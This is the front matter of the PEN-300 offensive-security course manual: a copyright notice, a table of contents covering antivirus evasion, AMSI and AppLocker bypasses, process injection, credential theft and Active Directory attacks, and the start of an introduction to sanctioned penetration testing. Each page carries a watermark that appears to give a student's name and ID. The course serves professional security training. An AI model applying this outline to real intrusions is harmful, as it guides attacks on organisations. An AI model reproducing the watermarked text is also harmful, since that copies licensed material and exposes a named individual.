 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
1 
Evasion Techniques and  
Breaching Defenses 
Offensive Security 
 
 
 
                                            
 
555704
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
2 
Copyright © 2021 Offensive Security Ltd.   
 
All rights reserved. No part of this publication, in whole or in part, may be reproduced, 
copied, transferred or any other right reserved to its copyright owner, including 
photocopying and all other copying, any transfer or transmission using any network or 
other means of communication, any broadcast for distant learning, in any form or by any 
means such as any information storage, transmission or retrieval system, without prior 
written permission from the author. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
3 
Table of Contents 
1 
Evasion Techniques and Breaching Defenses: General Course Information ............................. 16 
1.1 
About The PEN-300 Course ........................................................................................................ 16 
1.2 
Provided Material .......................................................................................................................... 17 
1.2.1 
PEN-300 Course Materials ..................................................................................................... 17 
1.2.2 
Access to the PEN-300 VPN Lab Network .......................................................................... 17 
1.2.3 
The Offensive Security Student Forum ................................................................................ 18 
1.2.4 
Live Support and RocketChat ................................................................................................ 18 
1.2.5 
OSEP Exam Attempt ................................................................................................................ 18 
1.3 
Overall Strategies for Approaching the Course ...................................................................... 19 
1.3.1 
Course Materials ...................................................................................................................... 19 
1.3.2 
Course Exercises ...................................................................................................................... 19 
1.4 
About the PEN-300 VPN Labs .................................................................................................... 20 
1.4.1 
Control Panel ............................................................................................................................ 20 
1.4.2 
Reverts ....................................................................................................................................... 20 
1.4.3 
Client Machines ........................................................................................................................ 20 
1.4.4 
Kali Virtual Machine ................................................................................................................. 21 
1.4.5 
Lab Behavior and Lab Restrictions ....................................................................................... 21 
1.5 
About the OSEP Exam ................................................................................................................. 21 
1.6 
Wrapping Up .................................................................................................................................. 22 
2 
Operating System and Programming Theory ................................................................................... 23 
2.1 
Programming Theory ................................................................................................................... 23 
2.1.1 
Programming Language Level .............................................................................................. 23 
2.1.2 
Programming Concepts ......................................................................................................... 25 
2.2 
Windows Concepts ...................................................................................................................... 26 
2.2.1 
Windows On Windows ............................................................................................................ 26 
2.2.2 
Win32 APIs ................................................................................................................................ 27 
2.2.3 
Windows Registry .................................................................................................................... 28 
2.3 
Wrapping Up .................................................................................................................................. 29 
3 
Client Side Code Execution With Office ............................................................................................. 30 
3.1 
Will You Be My Dropper ............................................................................................................... 30 
3.1.1 
Staged vs Non-staged Payloads ........................................................................................... 31 
3.1.2 
Building Our Droppers ............................................................................................................. 31 
3.1.2.1 
Exercise ............................................................................................................................. 34 
3.1.3 
HTML Smuggling ..................................................................................................................... 34 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
4 
3.1.3.1 
Exercises .......................................................................................................................... 38 
3.2 
Phishing with Microsoft Office ................................................................................................... 38 
3.2.1 
Installing Microsoft Office ...................................................................................................... 38 
3.2.1.1 
Exercise ............................................................................................................................. 40 
3.2.2 
Introduction to VBA ................................................................................................................. 40 
3.2.2.1 
Exercises .......................................................................................................................... 48 
3.2.3 
Let PowerShell Help Us ........................................................................................................... 48 
3.2.3.1 
Exercises .......................................................................................................................... 51 
3.3 
Keeping Up Appearances ............................................................................................................ 52 
3.3.1 
Phishing PreTexting ................................................................................................................. 52 
3.3.2 
The Old Switcheroo ................................................................................................................. 54 
3.3.2.1 
Exercises .......................................................................................................................... 58 
3.4 
Executing Shellcode in Word Memory ...................................................................................... 58 
3.4.1 
Calling Win32 APIs from VBA ................................................................................................ 58 
3.4.1.1 
Exercises .......................................................................................................................... 60 
3.4.2 
VBA Shellcode Runner ............................................................................................................ 61 
3.4.2.1 
Exercise ............................................................................................................................. 66 
3.5 
PowerShell Shellcode Runner .................................................................................................... 66 
3.5.1 
Calling Win32 APIs from PowerShell ................................................................................... 67 
3.5.1.1 
Exercises .......................................................................................................................... 69 
3.5.2 
Porting Shellcode Runner to PowerShell ............................................................................. 70 
3.5.2.1 
Exercises .......................................................................................................................... 73 
3.6 
Keep That PowerShell in Memory ............................................................................................. 74 
3.6.1 
Add-Type Compilation ............................................................................................................ 74 
3.6.1.1 
Exercises .......................................................................................................................... 77 
3.6.2 
Leveraging UnsafeNativeMethods ....................................................................................... 77 
3.6.2.1 
Exercises .......................................................................................................................... 85 
3.6.3 
DelegateType Reflection ......................................................................................................... 85 
3.6.3.1 
Exercises .......................................................................................................................... 90 
3.6.4 
Reflection Shellcode Runner in PowerShell ........................................................................ 90 
3.6.4.1 
Exercises .......................................................................................................................... 94 
3.7 
Talking To The Proxy ................................................................................................................... 94 
3.7.1 
PowerShell Proxy-Aware Communication .......................................................................... 94 
3.7.1.1 
Exercises .......................................................................................................................... 96 
3.7.2 
Fiddling With The User-Agent ................................................................................................ 96 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
5 
3.7.2.1 
Exercises .......................................................................................................................... 97 
3.7.3 
Give Me A SYSTEM Proxy ...................................................................................................... 97 
3.7.3.1 
Exercise ........................................................................................................................... 101 
3.8 
Wrapping Up ................................................................................................................................ 101 
4 
Client Side Code Execution With Windows Script Host ................................................................ 102 
4.1 
Creating a Basic Dropper in Jscript ........................................................................................ 102 
4.1.1 
Execution of Jscript on Windows ....................................................................................... 103 
4.1.1.1 
Exercises ........................................................................................................................ 104 
4.1.2 
Jscript Meterpreter Dropper ................................................................................................ 104 
4.1.2.1 
Exercises ........................................................................................................................ 107 
4.2 
Jscript and C# ............................................................................................................................. 107 
4.2.1 
Introduction to Visual Studio ............................................................................................... 107 
4.2.1.1 
Exercises ........................................................................................................................ 112 
4.2.2 
DotNetToJscript ..................................................................................................................... 112 
4.2.2.1 
Exercises ........................................................................................................................ 116 
4.2.3 
Win32 API Calls From C# ..................................................................................................... 117 
4.2.3.1 
Exercise ........................................................................................................................... 119 
4.2.4 
Shellcode Runner in C# ......................................................................................................... 119 
4.2.4.1 
Exercise ........................................................................................................................... 121 
4.2.5 
Jscript Shellcode Runner ...................................................................................................... 122 
4.2.5.1 
Exercises ........................................................................................................................ 123 
4.2.5.2 
Extra Mile ........................................................................................................................ 123 
4.2.6 
SharpShooter .......................................................................................................................... 123 
4.2.6.1 
Exercises ........................................................................................................................ 125 
4.3 
In-memory PowerShell Revisited ............................................................................................. 125 
4.3.1 
Reflective Load ....................................................................................................................... 125 
4.3.1.1 
Exercises ........................................................................................................................ 129 
4.4 
Wrapping Up ................................................................................................................................ 129 
5 
Process Injection and Migration ........................................................................................................ 131 
5.1 
Finding a Home for Our Shellcode .......................................................................................... 131 
5.1.1 
Process Injection and Migration Theory ........................................................................... 131 
5.1.2 
Process Injection in C# ......................................................................................................... 135 
5.1.2.1 
Exercises ........................................................................................................................ 140 
5.1.2.2 
Extra Mile ........................................................................................................................ 140 
5.2 
DLL Injection ................................................................................................................................ 140 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
6 
5.2.1 
DLL Injection Theory .............................................................................................................. 141 
5.2.2 
DLL Injection with C# ............................................................................................................ 142 
5.2.2.1 
Exercise ........................................................................................................................... 146 
5.3 
Reflective DLL Injection ............................................................................................................. 146 
5.3.1 
Reflective DLL Injection Theory ........................................................................................... 146 
5.3.2 
Reflective DLL Injection in PowerShell ............................................................................... 146 
5.3.2.1 
Exercises ........................................................................................................................ 148 
5.4 
Process Hollowing ..................................................................................................................... 148 
5.4.1 
Process Hollowing Theory ................................................................................................... 148 
5.4.2 
Process Hollowing in C# ...................................................................................................... 150 
5.4.2.1 
Exercises ........................................................................................................................ 157 
5.5 
Wrapping Up ................................................................................................................................ 157 
6 
Introduction to Antivirus Evasion ...................................................................................................... 158 
6.1 
Antivirus Software Overview .................................................................................................... 158 
6.2 
Simulating the Target Environment ........................................................................................ 158 
6.3 
Locating Signatures in Files ..................................................................................................... 159 
6.3.1.1 
Exercise ........................................................................................................................... 166 
6.4 
Bypassing Antivirus with Metasploit ....................................................................................... 166 
6.4.1 
Metasploit Encoders ............................................................................................................. 166 
6.4.1.1 
Exercise ........................................................................................................................... 171 
6.4.2 
Metasploit Encryptors ........................................................................................................... 171 
6.4.2.1 
Exercises ........................................................................................................................ 173 
6.5 
Bypassing Antivirus with C ....................................................................................................... 173 
6.5.1 
C# Shellcode Runner vs Antivirus ....................................................................................... 173 
6.5.1.1 
Exercises ........................................................................................................................ 176 
6.5.2 
Encrypting the C# Shellcode Runner .................................................................................. 176 
6.5.2.1 
Exercises ........................................................................................................................ 179 
6.6 
Messing with Our Behavior ....................................................................................................... 179 
6.6.1 
Simple Sleep Timers .............................................................................................................. 179 
6.6.1.1 
Exercises ........................................................................................................................ 182 
6.6.2 
Non-emulated APIs ................................................................................................................ 183 
6.6.2.1 
Exercises ........................................................................................................................ 185 
6.7 
Office Please Bypass Antivirus ................................................................................................ 186 
6.7.1 
Bypassing Antivirus in VBA .................................................................................................. 186 
6.7.1.1 
Exercises ........................................................................................................................ 190 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
7 
6.7.2 
Stomping On Microsoft Word .............................................................................................. 190 
6.7.2.1 
Exercises ........................................................................................................................ 200 
6.8 
Hiding PowerShell Inside VBA .................................................................................................. 200 
6.8.1 
Detection of PowerShell Shellcode Runner ...................................................................... 200 
6.8.1.1 
Exercises ........................................................................................................................ 201 
6.8.2 
Dechaining with WMI ............................................................................................................ 202 
6.8.2.1 
Exercises ........................................................................................................................ 204 
6.8.3 
Obfuscating VBA .................................................................................................................... 205 
6.8.3.1 
Exercises ........................................................................................................................ 211 
6.8.3.2 
Extra Mile ........................................................................................................................ 212 
6.9 
Wrapping Up ................................................................................................................................ 212 
7 
Advanced Antivirus Evasion ............................................................................................................... 213 
7.1 
Intel Architecture and Windows 10 ......................................................................................... 213 
7.1.1 
WinDbg Introduction ............................................................................................................. 216 
7.1.1.1 
Exercises ........................................................................................................................ 221 
7.2 
Antimalware Scan Interface ..................................................................................................... 221 
7.2.1 
Understanding AMSI ............................................................................................................. 222 
7.2.2 
Hooking with Frida ................................................................................................................. 224 
7.2.2.1 
Exercises ........................................................................................................................ 229 
7.3 
Bypassing AMSI With Reflection in PowerShell ................................................................... 229 
7.3.1 
What Context Mom? .............................................................................................................. 229 
7.3.1.1 
Exercises ........................................................................................................................ 236 
7.3.2 
Attacking Initialization ........................................................................................................... 236 
7.3.2.1 
Exercise ........................................................................................................................... 237 
7.4 
Wrecking AMSI in PowerShell .................................................................................................. 237 
7.4.1 
Understanding the Assembly Flow ..................................................................................... 237 
7.4.1.1 
Exercises ........................................................................................................................ 238 
7.4.2 
Patching the Internals ........................................................................................................... 239 
7.4.2.1 
Exercises ........................................................................................................................ 244 
7.4.2.2 
Extra Mile ........................................................................................................................ 244 
7.5 
UAC Bypass vs Microsoft Defender ........................................................................................ 244 
7.5.1 
FodHelper UAC Bypass ......................................................................................................... 244 
7.5.1.1 
Exercises ........................................................................................................................ 248 
7.5.2 
Improving Fodhelper ............................................................................................................. 248 
7.5.2.1 
Exercises ........................................................................................................................ 250 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
8 
7.6 
Bypassing AMSI in JScript ........................................................................................................ 251 
7.6.1 
Detecting the AMSI API Flow ............................................................................................... 251 
7.6.1.1 
Exercise ........................................................................................................................... 253 
7.6.2 
Is That Your Registry Key? ................................................................................................... 253 
7.6.2.1 
Exercises ........................................................................................................................ 258 
7.6.3 
I Am My Own Executable ...................................................................................................... 259 
7.6.3.1 
Exercises ........................................................................................................................ 263 
7.7 
Wrapping Up ................................................................................................................................ 263 
8 
Application Whitelisting ....................................................................................................................... 264 
8.1 
Application Whitelisting Theory and Setup ............................................................................ 264 
8.1.1 
Application Whitelisting Theory .......................................................................................... 264 
8.1.2 
AppLocker Setup and Rules ................................................................................................. 266 
8.1.2.1 
Exercises ........................................................................................................................ 271 
8.2 
Basic Bypasses ........................................................................................................................... 271 
8.2.1 
Trusted Folders ...................................................................................................................... 271 
8.2.1.1 
Exercises ........................................................................................................................ 273 
8.2.2 
Bypass With DLLs .................................................................................................................. 273 
8.2.2.1 
Exercises ........................................................................................................................ 276 
8.2.2.2 
Extra Mile ........................................................................................................................ 276 
8.2.3 
Alternate Data Streams ........................................................................................................ 276 
8.2.3.1 
Exercises ........................................................................................................................ 277 
8.2.4 
Third Party Execution ............................................................................................................ 278 
8.2.4.1 
Exercise ........................................................................................................................... 278 
8.3 
Bypassing AppLocker with PowerShell .................................................................................. 278 
8.3.1 
PowerShell Constrained Language Mode ......................................................................... 278 
8.3.1.1 
Exercises ........................................................................................................................ 280 
8.3.2 
Custom Runspaces ............................................................................................................... 280 
8.3.2.1 
Exercises ........................................................................................................................ 283 
8.3.3 
PowerShell CLM Bypass ....................................................................................................... 283 
8.3.3.1 
Exercises ........................................................................................................................ 288 
8.3.4 
Reflective Injection Returns ................................................................................................. 288 
8.3.4.1 
Exercise ........................................................................................................................... 289 
8.4 
Bypassing AppLocker with C .................................................................................................... 289 
8.4.1 
Locating a Target ................................................................................................................... 289 
8.4.2 
Reverse Engineering for Load .............................................................................................. 290 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
9 
8.4.2.1 
Exercises ........................................................................................................................ 297 
8.4.3 
Give Me Code Exec ................................................................................................................ 298 
8.4.3.1 
Exercise ........................................................................................................................... 299 
8.4.4 
Invoking the Target Part 1 .................................................................................................... 299 
8.4.4.1 
Exercises ........................................................................................................................ 305 
8.4.5 
Invoking the Target Part 2 .................................................................................................... 305 
8.4.5.1 
Exercises ........................................................................................................................ 308 
8.4.5.2 
Extra Mile ........................................................................................................................ 308 
8.5 
Bypassing AppLocker with JScript ......................................................................................... 308 
8.5.1 
JScript and MSHTA ............................................................................................................... 308 
8.5.1.1 
Exercises ........................................................................................................................ 310 
8.5.2 
XSL Transform ....................................................................................................................... 311 
8.5.2.1 
Exercises ........................................................................................................................ 312 
8.5.2.2 
Extra Mile ........................................................................................................................ 312 
8.6 
Wrapping Up ................................................................................................................................ 312 
9 
Bypassing Network Filters .................................................................................................................. 314 
9.1 
DNS Filters ................................................................................................................................... 316 
9.1.1.1 
Exercises ........................................................................................................................ 321 
9.1.2 
Dealing with DNS Filters ....................................................................................................... 321 
9.1.2.1 
Exercise ........................................................................................................................... 323 
9.2 
Web Proxies ................................................................................................................................. 323 
9.2.1 
Bypassing Web Proxies ........................................................................................................ 325 
9.2.1.1 
Exercises ........................................................................................................................ 328 
9.3 
IDS and IPS Sensors .................................................................................................................. 328 
9.3.1 
Case Study: Bypassing Norton HIPS with Custom Certificates ................................... 330 
9.3.1.1 
Exercises ........................................................................................................................ 337 
9.4 
Full Packet Capture Devices ..................................................................................................... 337 
9.5 
HTTPS Inspection ....................................................................................................................... 337 
9.6 
Domain Fronting ......................................................................................................................... 338 
9.6.1 
Domain Fronting with Azure CDN ....................................................................................... 345 
9.6.1.1 
Exercise ........................................................................................................................... 358 
9.6.1.2 
Extra Mile ........................................................................................................................ 359 
9.6.2 
Domain Fronting in the Lab .................................................................................................. 359 
9.6.2.1 
Exercises ........................................................................................................................ 365 
9.6.2.2 
Extra Mile ........................................................................................................................ 365 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
10 
9.7 
DNS Tunneling ............................................................................................................................ 365 
9.7.1 
How DNS Tunneling Works .................................................................................................. 365 
9.7.2 
DNS Tunneling with dnscat2 ............................................................................................... 367 
9.7.2.1 
Exercises ........................................................................................................................ 372 
9.8 
Wrapping Up ................................................................................................................................ 372 
10 
Linux Post-Exploitation .................................................................................................................... 373 
10.1 
User Configuration Files ............................................................................................................ 373 
10.1.1 
VIM Config Simple Backdoor .......................................................................................... 374 
10.1.1.1 
Exercises .................................................................................................................... 378 
10.1.1.2 
Extra Mile ................................................................................................................... 378 
10.1.2 
VIM Config Simple Keylogger ......................................................................................... 378 
10.1.2.1 
Exercises .................................................................................................................... 381 
10.2 
Bypassing AV ............................................................................................................................... 381 
10.2.1 
Kaspersky Endpoint Security .......................................................................................... 381 
10.2.2 
Antiscan.me ........................................................................................................................ 388 
10.2.2.1 
Exercises .................................................................................................................... 394 
10.2.2.2 
Extra Mile ................................................................................................................... 394 
10.3 
Shared Libraries .......................................................................................................................... 395 
10.3.1 
How Shared Libraries Work on Linux ............................................................................ 395 
10.3.2 
Shared Library Hijacking via LD_LIBRARY_PATH ....................................................... 396 
10.3.2.1 
Exercises .................................................................................................................... 402 
10.3.2.2 
Extra Mile ................................................................................................................... 403 
10.3.3 
Exploitation via LD_PRELOAD ......................................................................................... 403 
10.3.3.1 
Exercises .................................................................................................................... 408 
10.4 
Wrapping Up ................................................................................................................................ 408 
11 
Kiosk Breakouts ................................................................................................................................ 409 
11.1 
Kiosk Enumeration ..................................................................................................................... 409 
11.1.1 
Kiosk Browser Enumeration ............................................................................................ 412 
11.1.1.1 
Exercises .................................................................................................................... 415 
11.2 
Command Execution ................................................................................................................. 415 
11.2.1 
Exploring the Filesystem .................................................................................................. 416 
11.2.2 
Leveraging Firefox Profiles .............................................................................................. 421 
11.2.3 
Enumerating System Information .................................................................................. 423 
11.2.4 
Scratching the Surface ..................................................................................................... 427 
11.2.4.1 
Exercises .................................................................................................................... 431 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
11 
11.2.4.2 
Extra Mile ................................................................................................................... 431 
11.3 
Post-Exploitation ......................................................................................................................... 431 
11.3.1 
Simulating an Interactive Shell ....................................................................................... 431 
11.3.1.1 
Exercises .................................................................................................................... 433 
11.3.1.2 
Extra Mile ................................................................................................................... 433 
11.4 
Privilege Escalation .................................................................................................................... 433 
11.4.1 
Thinking Outside the Box ................................................................................................. 435 
11.4.2 
Root Shell at the Top of the Hour ................................................................................... 441 
11.4.3 
Getting Root Terminal Access ........................................................................................ 444 
11.4.3.1 
Exercises .................................................................................................................... 448 
11.5 
Windows Kiosk Breakout Techniques .................................................................................... 448 
11.5.1.1 
Exercises .................................................................................................................... 457 
11.6 
Wrapping Up ................................................................................................................................ 458 
12 
Windows Credentials ....................................................................................................................... 459 
12.1 
Local Windows Credentials ...................................................................................................... 459 
12.1.1 
SAM Database ................................................................................................................... 459 
12.1.1.1 
Exercises .................................................................................................................... 463 
12.1.2 
Hardening the Local Administrator Account ................................................................ 463 
12.1.2.1 
Exercises .................................................................................................................... 466 
12.2 
Access Tokens ............................................................................................................................ 467 
12.2.1 
Access Token Theory ....................................................................................................... 467 
12.2.1.1 
Exercise ...................................................................................................................... 470 
12.2.2 
Elevation with Impersonation ......................................................................................... 470 
12.2.2.1 
Exercises .................................................................................................................... 485 
12.2.3 
Fun with Incognito ............................................................................................................. 486 
12.2.3.1 
Exercise ...................................................................................................................... 487 
12.3 
Kerberos and Domain Credentials .......................................................................................... 487 
12.3.1 
Kerberos Authentication .................................................................................................. 487 
12.3.2 
Mimikatz .............................................................................................................................. 490 
12.3.2.1 
Exercises .................................................................................................................... 494 
12.4 
Processing Credentials Offline ................................................................................................. 494 
12.4.1 
Memory Dump ................................................................................................................... 494 
12.4.1.1 
Exercises .................................................................................................................... 497 
12.4.2 
MiniDumpWriteDump ....................................................................................................... 497 
12.4.2.1 
Exercises .................................................................................................................... 502 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
12 
12.5 
Wrapping Up ................................................................................................................................ 502 
13 
Windows Lateral Movement .......................................................................................................... 503 
13.1 
Remote Desktop Protocol ......................................................................................................... 504 
13.1.1 
Lateral Movement with RDP ............................................................................................ 504 
13.1.1.1 
Exercises .................................................................................................................... 510 
13.1.2 
Reverse RDP Proxying with Metasploit ......................................................................... 510 
13.1.2.1 
Exercise ...................................................................................................................... 513 
13.1.3 
Reverse RDP Proxying with Chisel ................................................................................. 513 
13.1.3.1 
Exercise ...................................................................................................................... 516 
13.1.4 
RDP as a Console .............................................................................................................. 516 
13.1.4.1 
Exercise ...................................................................................................................... 518 
13.1.5 
Stealing Clear Text Credentials from RDP .................................................................... 518 
13.1.5.1 
Exercises .................................................................................................................... 522 
13.2 
Fileless Lateral Movement ........................................................................................................ 522 
13.2.1 
Authentication and Execution Theory ........................................................................... 522 
13.2.2 
Implementing Fileless Lateral Movement in C ............................................................ 524 
13.2.2.1 
Exercises .................................................................................................................... 528 
13.3 
Wrapping Up ................................................................................................................................ 528 
14 
Linux Lateral Movement ................................................................................................................. 529 
14.1 
Lateral Movement with SSH ..................................................................................................... 529 
14.1.1 
SSH Keys ............................................................................................................................. 530 
14.1.2 
SSH Persistence ................................................................................................................ 533 
14.1.2.1 
Exercises .................................................................................................................... 534 
14.1.3 
SSH Hijacking with ControlMaster ................................................................................. 535 
14.1.4 
SSH Hijacking Using SSH-Agent and SSH Agent Forwarding .................................. 537 
14.1.4.1 
Exercises .................................................................................................................... 541 
14.2 
DevOps ......................................................................................................................................... 541 
14.2.1 
Introduction to Ansible ..................................................................................................... 542 
14.2.2 
Enumerating Ansible ......................................................................................................... 543 
14.2.3 
Ad-hoc Commands ........................................................................................................... 543 
14.2.4 
Ansible Playbooks ............................................................................................................. 544 
14.2.5 
Exploiting Playbooks for Ansible Credentials .............................................................. 546 
14.2.6 
Weak Permissions on Ansible Playbooks ..................................................................... 549 
14.2.7 
Sensitive Data Leakage via Ansible Modules ............................................................... 551 
14.2.7.1 
Exercises .................................................................................................................... 553 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
13 
14.2.8 
Introduction to Artifactory ............................................................................................... 553 
14.2.9 
Artifactory Enumeration ................................................................................................... 556 
14.2.10 
Compromising Artifactory Backups .............................................................................. 557 
14.2.11 
Compromising Artifactory’s Database .......................................................................... 558 
14.2.12 
Adding a Secondary Artifactory Admin Account ......................................................... 560 
14.2.12.1 
Exercises .................................................................................................................... 562 
14.3 
Kerberos on Linux ....................................................................................................................... 562 
14.3.1 
General Introduction to Kerberos on Linux .................................................................. 562 
14.3.2 
Stealing Keytab Files ......................................................................................................... 565 
14.3.2.1 
Exercise ...................................................................................................................... 567 
14.3.3 
Attacking Using Credential Cache Files ........................................................................ 567 
14.3.4 
Using Kerberos with Impacket ........................................................................................ 569 
14.3.4.1 
Exercises .................................................................................................................... 572 
14.3.4.2 
Extra Mile ................................................................................................................... 572 
14.4 
Wrapping Up ................................................................................................................................ 572 
15 
Microsoft SQL Attacks .................................................................................................................... 573 
15.1 
MS SQL in Active Directory ....................................................................................................... 573 
15.1.1 
MS SQL Enumeration ....................................................................................................... 573 
15.1.1.1 
Exercise ...................................................................................................................... 575 
15.1.2 
MS SQL Authentication .................................................................................................... 575 
15.1.2.1 
Exercises .................................................................................................................... 580 
15.1.3 
UNC Path Injection ............................................................................................................ 580 
15.1.3.1 
Exercises .................................................................................................................... 584 
15.1.4 
Relay My Hash ................................................................................................................... 584 
15.1.4.1 
Exercises .................................................................................................................... 587 
15.2 
MS SQL Escalation ..................................................................................................................... 587 
15.2.1 
Privilege Escalation ........................................................................................................... 587 
15.2.1.1 
Exercises .................................................................................................................... 590 
15.2.2 
Getting Code Execution .................................................................................................... 591 
15.2.2.1 
Exercises .................................................................................................................... 594 
15.2.3 
Custom Assemblies .......................................................................................................... 594 
15.2.3.1 
Exercises .................................................................................................................... 600 
15.3 
Linked SQL Servers .................................................................................................................... 600 
15.3.1 
Follow the Link ................................................................................................................... 601 
15.3.1.1 
Exercises .................................................................................................................... 604 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
14 
15.3.1.2 
Extra Mile ................................................................................................................... 604 
15.3.2 
Come Home To Me ........................................................................................................... 604 
15.3.2.1 
Exercises .................................................................................................................... 606 
15.3.2.2 
Extra Mile ................................................................................................................... 606 
15.4 
Wrapping Up ................................................................................................................................ 606 
16 
Active Directory Exploitation .......................................................................................................... 607 
16.1 
AD Object Security Permissions .............................................................................................. 607 
16.1.1 
Object Permission Theory ............................................................................................... 607 
16.1.1.1 
Exercises .................................................................................................................... 610 
16.1.2 
Abusing GenericAll ............................................................................................................ 610 
16.1.2.1 
Exercises .................................................................................................................... 612 
16.1.3 
Abusing WriteDACL ........................................................................................................... 613 
16.1.3.1 
Exercises .................................................................................................................... 615 
16.1.3.2 
Extra Mile ................................................................................................................... 615 
16.2 
Kerberos Delegation ................................................................................................................... 615 
16.2.1 
Unconstrained Delegation ............................................................................................... 616 
16.2.1.1 
Exercise ...................................................................................................................... 622 
16.2.2 
I Am a Domain Controller ................................................................................................. 622 
16.2.2.1 
Exercises .................................................................................................................... 626 
16.2.3 
Constrained Delegation .................................................................................................... 626 
16.2.3.1 
Exercises .................................................................................................................... 632 
16.2.4 
Resource-Based Constrained Delegation ..................................................................... 632 
16.2.4.1 
Exercises .................................................................................................................... 638 
16.3 
Active Directory Forest Theory ................................................................................................ 638 
16.3.1 
Active Directory Trust in a Forest ................................................................................... 639 
16.3.2 
Enumeration in the Forest ............................................................................................... 642 
16.3.2.1 
Exercises .................................................................................................................... 645 
16.4 
Burning Down the Forest .......................................................................................................... 645 
16.4.1 
Owning the Forest with Extra SIDs ................................................................................ 645 
16.4.1.1 
Exercise ...................................................................................................................... 650 
16.4.1.2 
Extra Mile ................................................................................................................... 651 
16.4.2 
Owning the Forest with Printers ..................................................................................... 651 
16.4.2.1 
Exercises .................................................................................................................... 653 
16.5 
Going Beyond the Forest ........................................................................................................... 653 
16.5.1 
Active Directory Trust Between Forests ....................................................................... 654 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
15 
16.5.2 
Enumeration Beyond the Forest ..................................................................................... 655 
16.5.2.1 
Exercises .................................................................................................................... 658 
16.6 
Compromising an Additional Forest ....................................................................................... 658 
16.6.1 
Show Me Your Extra SID .................................................................................................. 658 
16.6.1.1 
Exercises .................................................................................................................... 664 
16.6.2 
Linked SQL Servers in the Forest ................................................................................... 664 
16.6.2.1 
Exercises .................................................................................................................... 667 
16.6.2.2 
Extra Mile ................................................................................................................... 667 
16.7 
Wrapping Up ................................................................................................................................ 667 
17 
Combining the Pieces ...................................................................................................................... 668 
17.1 
Enumeration and Shell .............................................................................................................. 668 
17.1.1 
Initial Enumeration ............................................................................................................ 669 
17.1.1.1 
Exercises .................................................................................................................... 671 
17.1.2 
Gaining an Initial Foothold ............................................................................................... 671 
17.1.2.1 
Exercises .................................................................................................................... 676 
17.1.3 
Post Exploitation Enumeration ....................................................................................... 676 
17.1.3.1 
Exercises .................................................................................................................... 680 
17.2 
Attacking Delegation .................................................................................................................. 680 
17.2.1 
Privilege Escalation on web01 ........................................................................................ 681 
17.2.1.1 
Exercises .................................................................................................................... 686 
17.2.2 
Getting the Hash ................................................................................................................ 686 
17.2.2.1 
Exercises .................................................................................................................... 691 
17.2.3 
Delegate My Ticket ............................................................................................................ 691 
17.2.3.1 
Exercises .................................................................................................................... 694 
17.3 
Owning the Domain .................................................................................................................... 695 
17.3.1 
Lateral Movement ............................................................................................................. 695 
17.3.1.1 
Exercises .................................................................................................................... 700 
17.3.2 
Becoming Domain Admin ................................................................................................ 700 
17.3.2.1 
Exercises .................................................................................................................... 704 
17.3.2.2 
Extra Mile ................................................................................................................... 704 
17.4 
Wrapping Up ................................................................................................................................ 704 
18 
Trying Harder: The Labs .................................................................................................................. 705 
18.1 
Real Life Simulations ................................................................................................................. 705 
18.2 
Wrapping Up ................................................................................................................................ 705 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
16 
1 Evasion Techniques and Breaching Defenses: General 
Course Information 
Welcome to the Evasion Techniques and Breaching Defenses (PEN-300) course! 
PEN-300 was created for security professionals who already have some experience in offensive 
techniques and penetration testing. 
This course will help you develop the skills and knowledge to bypass many different types of 
defenses while performing advanced types of attacks. 
Since the goal of this course is to teach offensive techniques that work against client 
organizations with hardened systems, we expect students to have taken the PWK1 course and 
passed the OSCP exam or have equivalent knowledge and skills. 
1.1 About The PEN-300 Course 
Before diving into the course related material it is important to spend a few moments on basic 
terminology. 
IT and information security professionals use various terminology for offensive operations and 
attacks. To prevent confusion we are going to define some of the main terms as we understand 
them and as they apply to this course. 
A penetration test is an engagement between a client organization and a penetration tester. 
During such an operation, the penetration tester will perform various sanctioned attacks against 
the client organization. These can vary in size, duration, and complexity. 
A penetration test can have various entry points into the targeted organization. In an assumed 
breach penetration test, the penetration tester is given standard or low-privileged user access to 
